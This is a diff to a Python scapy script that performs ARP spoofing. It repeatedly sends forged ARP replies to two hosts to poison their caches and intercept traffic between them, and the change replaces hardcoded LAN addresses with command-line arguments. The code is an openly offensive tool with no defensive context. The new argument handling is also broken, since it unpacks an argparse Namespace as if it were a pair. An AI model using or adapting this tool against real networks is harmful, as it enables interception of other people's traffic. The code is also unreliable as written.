@@ -1,5 +1,17 @@
 import scapy.all as scapy
+import argparse
 import time
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--first-ip', dest='first_ip', help='First target IP address')
+    parser.add_argument('-s', '--second-ip', dest='second_ip', help='Second target IP address')
+    options = parser.parse_args()
+    if not options.first_ip:
+        parser.error("[-] Please specify a first target IP")
+    if not options.second_ip:
+        parser.error("[-] Please specify a second target IP")
+    return options
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -14,13 +26,15 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+target_1, target_2 = get_arguments()
+
 packets_count = 0
 try:
     while True:
-        spoof("192.168.0.126", "192.168.0.1")
-        spoof("192.168.0.1", "192.168.0.126")
+        spoof(target_1, target_2)
+        spoof(target_2, target_1)
         packets_count += 2
         print("\r[+] Packets sent:" + str(packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL+C ... Quitting")
+    print("\n[-] Detected CTRL+C ... Quitting")
